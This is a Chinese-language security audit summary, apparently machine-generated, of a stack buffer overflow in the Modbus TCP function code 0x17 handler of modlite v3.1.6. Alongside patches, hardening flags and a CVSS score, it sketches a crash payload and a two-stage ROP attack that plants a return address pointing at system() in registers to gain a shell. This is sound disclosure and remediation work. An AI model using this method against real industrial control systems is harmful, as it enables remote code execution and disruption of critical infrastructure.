# modlite 源码安全审计 - 中文总结报告

## 一、审计结论

经过全面深入的源码审计，在 **modlite v3.1.6** Modbus TCP 协议解析器中发现了 **1 个严重的栈缓冲区溢出漏洞**，该漏洞可被远程利用以执行任意代码。

### 关键发现
- **漏洞类型**: 栈缓冲区溢出 (CWE-121)
- **严重等级**: **CRITICAL** (9.8/10)
- **利用难度**: 低 - 中等
- **影响范围**: 所有使用功能码 0x17 的代码路径
- **攻击前提**: 网络可达 Modbus TCP 服务，无需认证

---

## 二、核心漏洞分析

### 2.1 漏洞位置

```
文件: src/modbus_proto.c
函数: modbus_handle_fc17()
行号: 127-167 (核心漏洞在 144-152 行)
```

### 2.2 漏洞原理

该函数使用固定大小的**栈缓冲区** `response[128]` 来存储 Modbus 响应数据，但在写入数据时**未充分验证**请求参数 `nb_read` 的大小：

```c
uint8_t response[RESP_BUF_SIZE];  // RESP_BUF_SIZE = 128 字节

// 循环写入寄存器数据，无边界检查
for (uint16_t i = 0; i < nb_read; i++) {
    // 当 i >= 60 时开始溢出栈
    write_u16be(response + 9 + i * 2, val);  // 💥 栈溢出
}
```

### 2.3 溢出计算

**Modbus FC 0x17 响应帧结构**:
```
[MBAP Header 6B] + [Unit ID 1B] + [FC 1B] + [Byte Count 1B] + [Register Data nb_read×2B]
= 9 + nb_read × 2 字节
```

**溢出条件**:
- `nb_read = 60`: 响应 = 129 字节 → **开始溢出 1 字节**
- `nb_read = 125`: 响应 = 259 字节 → **溢出 131 字节** (最严重)

### 2.4 为什么危险？

溢出 131 字节足以覆盖：
1. **Saved RBP** (8 字节) - 破坏栈帧指针
2. **返回地址** (8 字节) - **劫持控制流**
3. **栈上其他数据** (115 字节) - 可注入 ROP 链

---

## 三、攻击方式

### 3.1 简单崩溃攻击 (DoS)

**载荷构造**:
```python
frame = create_modbus_frame(
    function_code=0x17,      # Read/Write Multiple Registers
    nb_read=125,             # 触发最大溢出
    read_addr=0x0000,
    write_addr=0x0000,
    nb_write=1,
    write_data=b'\x00\x00'
)

# 发送给目标
send_to_target(frame)
# 结果: 程序崩溃
```

### 3.2 高级攻击 (RCE)

**两阶段攻击**:

**阶段 1**: 写入 ROP 链到寄存器
```python
# 使用 FC 0x10 (Write Multiple Registers) 预先写入数据
write_registers(
    start_addr=60,  # 寄存器 60-124 对应溢出区域
    values=[
        0x4141, 0x4141, 0x4141, 0x4141,  # 填充到 saved RBP
        0x7fff, 0xf7a5,                  # 返回地址低位
        0x2390, 0x0000,                  # 返回地址高位 → libc system()
        # ... 后续 ROP gadgets
    ]
)
```

**阶段 2**: 触发溢出
```python
# 发送 FC 0x17 请求，读取寄存器 0-124
trigger_overflow(read_addr=0, nb_read=125)

# 结果:
# 1. 寄存器 60-124 的值被写入 response[129-258]
# 2. 覆盖返回地址为 system() 函数
# 3. 函数返回时执行 system("/bin/sh")
# 4. 攻击者获得 Shell 权限
```

### 3.3 攻击场景

| 攻击类型 | 难度 | 影响 |
|---------|------|------|
| 拒绝服务 (DoS) | ⭐ 极简单 | 服务崩溃，生产中断 |
| 信息泄露 | ⭐⭐ 简单 | 读取栈上敏感数据 |
| 代码执行 (RCE) | ⭐⭐⭐ 中等 | 完全控制系统 |
| 蠕虫传播 | ⭐⭐⭐⭐ 复杂 | 在工控网络中传播 |

---

## 四、真实世界影响

### 4.1 工控系统风险

Modbus TCP 广泛用于工业控制系统 (ICS/SCADA)，漏洞利用可能导致：

- **生产设施**: 生产线停机、设备损坏
- **电力系统**: 变电站失控、电网瘫痪
- **水处理**: 供水中断、水质污染
- **化工厂**: 安全系统失效、爆炸风险
- **智能建筑**: 门禁失效、消防系统失灵

### 4.2 历史案例参考

类似漏洞的真实攻击案例：
- **Stuxnet** (2010): 利用工控漏洞破坏伊朗核设施
- **BlackEnergy** (2015): 攻击乌克兰电网造成大停电
- **TRITON** (2017): 针对施耐德安全系统的攻击

---

## 五、漏洞验证

### 5.1 使用提供的工具

我已为您生成了完整的验证工具：

```bash
# 1. 生成 PoC 载荷
python3 poc_exploit.py

# 2. 编译目标程序 (带 AddressSanitizer)
make asan

# 3. 运行自动化验证
python3 verify_vulnerability.py

# 4. 手动测试单个 PoC
./build/modbus_parser_asan poc_crash.bin
```

### 5.2 预期输出 (ASAN 检测)

```
==12345==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffc12345678
WRITE of size 2 at 0x7ffc12345678 thread T0
    #0 0x401234 in write_u16be src/modbus_proto.c:34
    #1 0x401567 in modbus_handle_fc17 src/modbus_proto.c:152
    #2 0x4015ab in modbus_reply src/modbus_proto.c:208
    #3 0x401234 in main src/main.c:31

Address 0x7ffc12345678 is located in stack of thread T0 at offset 136
  in frame <modbus_handle_fc17>

SUMMARY: AddressSanitizer: stack-buffer-overflow
```

---

## 六、修复建议

### 🔴 紧急修复 (立即执行)

**最简修复** - 在 `modbus_handle_fc17()` 函数开头添加验证：

```c
int modbus_handle_fc17(const modbus_request_t *req, modbus_mapping_t *map)
{
    // ✅ 添加以下 3 行代码
    if (!req || !map) return -1;
    if (req->nb_read > 125) return -1;  // Modbus 协议上限
    if (9 + req->nb_read * 2 > RESP_BUF_SIZE) return -1;  // 缓冲区检查
    
    // ... 原有代码
}
```

**修复时间**: < 5 分钟  
**测试时间**: 30 分钟  
**部署时间**: 立即

### 🟡 中期加固 (1周内)

1. **增大缓冲区** (`include/modbus_proto.h`)
   ```c
   #define RESP_BUF_SIZE  (MBAP_LEN + 3 + 125 * 2 + 8)  // 267 bytes
   ```

2. **强化输入验证** (`src/modbus_proto.c`)
   ```c
   // 在 modbus_parse_request() 中添加
   if (req->nb_read == 0 || req->nb_read > 125) return -1;
   if (req->nb_write > 121) return -1;
   if (req->read_addr + req->nb_read > MODBUS_MAX_REGS) return -1;
   ```

3. **启用编译保护** (`Makefile`)
   ```makefile
   CFLAGS += -fstack-protector-strong -D_FORTIFY_SOURCE=2 -fPIE
   LDFLAGS += -pie -Wl,-z,relro,-z,now
   ```

### 🟢 长期重构 (未来版本)

- 使用动态内存分配替代栈缓冲区
- 实现统一的安全缓冲区管理
- 建立完善的输入验证框架

详细修复方案请参考 `FIXING_GUIDE.md`。

---

## 七、文档清单

本次审计生成了以下文档：

1. **EXECUTIVE_SUMMARY.md** - 执行摘要 (英文)
2. **SECURITY_AUDIT_REPORT.md** - 完整审计报告 (中文)
3. **EXPLOIT_ANALYSIS.md** - 深度利用分析
4. **FIXING_GUIDE.md** - 详细修复指南
5. **poc_exploit.py** - PoC 载荷生成器
6. **verify_vulnerability.py** - 自动化验证工具

---

## 八、关键指标

### 漏洞评分 (CVSS v3.1)

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

攻击向量 (AV):          Network (网络)
攻击复杂度 (AC):        Low (低)
所需权限 (PR):          None (无)
用户交互 (UI):          None (无)
影响范围 (S):           Unchanged (不变)
机密性影响 (C):         High (高)
完整性影响 (I):         High (高)
可用性影响 (A):         High (高)

总分: 9.8 / 10.0
```

### 时间估算

| 阶段 | 时间 |
|------|------|
| 漏洞发现 | 4 小时 (已完成) |
| PoC 开发 | 2 小时 (已完成) |
| 修复开发 | 4-8 小时 |
| 测试验证 | 4-8 小时 |
| 生产部署 | 2-4 小时 |
| **总计** | **1-2 个工作日** |

---

## 九、建议行动

### 立即执行 (今天)
1. ✅ 应用紧急修复补丁
2. ✅ 运行验证工具确认修复有效
3. ✅ 编写安全公告

### 短期行动 (本周)
4. ⏸ 部署到测试环境
5. ⏸ 执行完整回归测试
6. ⏸ 准备生产部署计划

### 中期行动 (本月)
7. ⏸ 实施所有加固措施
8. ⏸ 进行第三方安全审计
9. ⏸ 更新安全开发规范

---

## 十、联系方式

如有任何问题，请参考以下资源：

- **详细技术分析**: 阅读 `EXPLOIT_ANALYSIS.md`
- **修复指导**: 参考 `FIXING_GUIDE.md`
- **工具使用**: 运行 `python3 poc_exploit.py --help`

---

## 附录：快速命令参考

```bash
# 生成所有 PoC
python3 poc_exploit.py

# 验证漏洞
python3 verify_vulnerability.py

# 编译安全版本
make asan

# 手动测试
./build/modbus_parser_asan poc_crash.bin

# 查看崩溃堆栈
gdb --args ./modbus_parser poc_crash.bin
(gdb) run
(gdb) backtrace

# 编译修复后的版本
make clean && make

# 回归测试
make test
```

---

**审计完成时间**: 2026年6月12日  
**审计人员**: 自动化安全审计系统  
**文档版本**: 1.0

---

## 免责声明

本审计报告及相关工具仅供安全研究和漏洞修复使用。任何未经授权的攻击行为均属违法。请负责任地使用这些信息。
